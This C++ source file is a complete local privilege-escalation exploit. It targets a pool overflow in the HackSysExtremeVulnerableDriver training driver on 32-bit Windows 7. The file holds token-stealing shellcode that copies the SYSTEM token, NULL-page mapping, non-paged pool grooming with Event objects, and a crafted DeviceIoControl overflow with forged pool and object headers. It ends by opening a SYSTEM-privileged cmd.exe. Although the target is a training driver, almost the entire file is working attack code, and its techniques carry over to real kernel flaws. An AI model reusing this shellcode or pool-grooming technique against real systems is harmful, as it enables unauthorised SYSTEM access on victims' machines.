//test on windows7 x86
//g++ pooloverflow.cpp -m32 --static 
#include<stdio.h>
#include<stdint.h>
#include<windows.h>
typedef LONG NTSTATUS;
static VOID 
xxCreateCmdLineProcess(VOID){
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;
    WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
    BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi); // 创建cmd子进程
    if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

int main(){
    char sc[] = 
        "\x90\x90\x90\x90"              // NOP Sled
        "\x60"                          // pushad
        "\x31\xc0"                      // xor eax,eax
        "\x64\x8b\x80\x24\x01\x00\x00"  // mov eax,[fs:eax+0x124]
        "\x8b\x40\x50"                  // mov eax,[eax+0x50]
        "\x89\xc1"                      // mov ecx,eax
        "\xba\x04\x00\x00\x00"          // mov edx,0x4
        "\x8b\x80\xb8\x00\x00\x00"      // mov eax,[eax+0xb8]
        "\x2d\xb8\x00\x00\x00"          // sub eax,0xb8
        "\x39\x90\xb4\x00\x00\x00"      // cmp [eax+0xb4],edx
        "\x75\xed"                      // jnz 0x1a             
        "\x8b\x90\xf8\x00\x00\x00"      // mov edx,[eax+0xf8]
        "\x89\x91\xf8\x00\x00\x00"      // mov [ecx+0xf8],edx
        "\x61"                          // popad
        "\xC2\x10\x00";                 // ret 16   adjust stack or crash in KeUnstackDetachProcess()
        // "\xc3";                         // ret 
    PVOID ShellCode = VirtualAlloc(NULL,0x1000,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
    if(!ShellCode){
        printf("Failed to allocate execute memory:0x%X\n",GetLastError());
        return 1;
    }
    
    printf("allocate execute memory:%p\n",ShellCode);
    memcpy(ShellCode,sc,sizeof(sc));
    HANDLE hDevide = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
                                GENERIC_READ | GENERIC_WRITE,
                                NULL,
                                NULL,
                                OPEN_EXISTING,
                                NULL,
                                NULL);
    if(hDevide == INVALID_HANDLE_VALUE){
        printf("Create Device Fail:0x%X\n",GetLastError());
        return 1;
    }
    

	HMODULE hNtdll = GetModuleHandle("ntdll.dll");

	if (hNtdll == INVALID_HANDLE_VALUE) {
		printf("Could not open handle to ntdll. \n");
		CloseHandle(hDevide);
		return 1;
	}

    typedef NTSTATUS(WINAPI *PNtAllocateVirtualMemory)(
        HANDLE ProcessHandle,
        PVOID *BaseAddress,
        ULONG ZeroBits,
        PULONG AllocationSize,
        ULONG AllocationType,
        ULONG Protect
	);
	//Get address of NtAllocateVirtualMemory from the dynamically linked library and then cast it to a callable function type
	PNtAllocateVirtualMemory NtAllocateVirtualMemory = (PNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");

	if (!NtAllocateVirtualMemory) {
		printf("Failed Resolving NtAllocateVirtualMemory: 0x%X\n", GetLastError());
		return 1;
	}
    PVOID baseAddress = (PVOID)0x1;
	ULONG regionSize = 0x2000; //Probably enough, it will get rounded up to the next page size
    NTSTATUS ntStatus = NtAllocateVirtualMemory(
		GetCurrentProcess(), //Current process handle
		&baseAddress, //address we want our memory to start at, will get rounded down to the nearest page boundary
		0, //The number of high-order address bits that must be zero in the base address of the section view. Not a clue here
		&regionSize, //Required size - will be modified to actual size allocated, is rounded up to the next page boundary
		MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN, //claim memory straight away, get highest appropriate address
		PAGE_EXECUTE_READWRITE //All permissions
	);
    *(PLONG)(ntStatus+0x74) = (LONG)ShellCode;
    *(PLONG)(ntStatus+0x8) = (LONG)1;
    printf("Null ptr: *(0x%X) = 0x%X\n",ntStatus+0x74,*(PLONG)(ntStatus+0x74));


    HANDLE EventObject[5000] = {0};
    //file memory scrap
    for(int i = 0;i!=1000;i++){
        HANDLE hEvent = CreateEvent(NULL,false,false,NULL);
        if(!hEvent){
            printf("Failed to create defrag event 0x%X: 0x%X\r\n", i, GetLastError());
            return 1;
        }
    }
    for(int i = 0;i!=5000;i++){
        HANDLE hEvent = CreateEvent(NULL,false,false,NULL);
        if(!hEvent){
            printf("Failed to create defrag event 0x%X: 0x%X\r\n", i, GetLastError());
            return 1;
        }
        EventObject[i] = hEvent;
    }
    for(int i = 1;i!=10;i++){
        printf("Event Handle:0x%X\n",EventObject[5000-i]);//see see
    }
    for(int i = 0;i<5000;i+=16){
        for(int j = 0;j!=8;j++){
            if (!CloseHandle(EventObject[i+j])) {
				printf("Failed to punch hole with event object 0x%X: 0x%X\r\n", i+j, GetLastError());
				return 1;
			}
        }
        
    }

// kd> dt nt!_POOL_HEADER 86de3d40
//    +0x000 PreviousSize     : 0y001000000 (0x40)
//    +0x000 PoolIndex        : 0y0000000 (0)
//    +0x002 BlockSize        : 0y000001000 (0x8)
//    +0x002 PoolType         : 0y0000010 (0x2)
//    +0x000 Ulong1           : 0x4080040
//    +0x004 PoolTag          : 0xee657645
//    +0x004 AllocatorBackTraceIndex : 0x7645
//    +0x006 PoolTagHash      : 0xee65
// kd> dt nt!_OBJECT_HEADER_QUOTA_INFO 86de3d40+8
//    +0x000 PagedPoolCharge  : 0
//    +0x004 NonPagedPoolCharge : 0x40
//    +0x008 SecurityDescriptorCharge : 0
//    +0x00c SecurityDescriptorQuotaBlock : (null) 
// kd> dt nt!_OBJECT_HEADER 86de3d40+8+10
//    +0x000 PointerCount     : 0n1
//    +0x004 HandleCount      : 0n1
//    +0x004 NextToFree       : 0x00000001 Void
//    +0x008 Lock             : _EX_PUSH_LOCK
//    +0x00c TypeIndex        : 0xc ''
//    +0x00d TraceFlags       : 0 ''
//    +0x00e InfoMask         : 0x8 ''
//    +0x00f Flags            : 0 ''
//    +0x010 ObjectCreateInfo : 0x887a4d80 _OBJECT_CREATE_INFORMATION
//    +0x010 QuotaBlockCharged : 0x887a4d80 Void
//    +0x014 SecurityDescriptor : (null) 
//    +0x018 Body             : _QUAD
// 86de3d40  04080040 ee657645 00000000 00000040
// 86de3d50  00000000 00000000 00000001 00000001
// 86de3d60  00000000 0008000c

    DWORD PoolHeader[] = {0x04080040,0xee657645};
    DWORD ObjectHeaderQuotaInfo[] = {0x00000000,0x00000040,0x00000000,0x00000000};
    DWORD ObjectHeader[] = {0x00000001,0x00000001,0x00000000,0x00080000};


    DWORD buf[0x200+0x40];
    memset(buf,'A',0x1f8);
    *(buf+0x1f8/4) = PoolHeader[0];
    *(buf+0x1f8/4+1) = PoolHeader[1];
    *(buf+0x1f8/4+2) = *ObjectHeaderQuotaInfo;
    *(buf+0x1f8/4+3) = ObjectHeaderQuotaInfo[1];
    *(buf+0x1f8/4+4) = ObjectHeaderQuotaInfo[2];
    *(buf+0x1f8/4+5) = ObjectHeaderQuotaInfo[3];
    *(buf+0x1f8/4+6) = *ObjectHeader;
    *(buf+0x1f8/4+7) = ObjectHeader[1];
    *(buf+0x1f8/4+8) = ObjectHeader[2];
    *(buf+0x1f8/4+9) = ObjectHeader[3];


    DWORD recvBuf;
    DeviceIoControl(hDevide,0x22200F,buf,0x1f8+0x28,NULL,0,&recvBuf,NULL);
    
    system("pause");
    //run
    for(int i = 0;i<5000;i+=16){
        for(int j = 8;j!=16 && i+j<5000;j++){
            if (!CloseHandle(EventObject[i+j])) {
				printf("Failed to punch hole with event object 0x%X: 0x%X\r\n", i+j, GetLastError());
				return 1;
			}
        }
        
    }
    // system("pause");
    xxCreateCmdLineProcess();
    return 0;
}